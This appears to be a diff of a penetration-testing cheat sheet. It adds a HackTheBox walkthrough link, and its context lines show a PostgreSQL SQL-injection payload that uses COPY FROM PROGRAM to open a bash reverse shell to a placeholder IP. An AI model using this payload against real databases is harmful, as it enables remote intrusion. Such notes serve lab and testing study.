@@ -1007,6 +1007,7 @@ PostgreSQL version 9.3 vs 11.5
 https://www.exploit-db.com/exploits/46813
 '; CREATE TABLE cmd_exec(cmd_output text); --
 '; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/IP/1234 0>&1'''; -- 
+https://www.aldeid.com/wiki/HackTheBox-StartingPoint-Vaccine
 
 ## SSRF
 
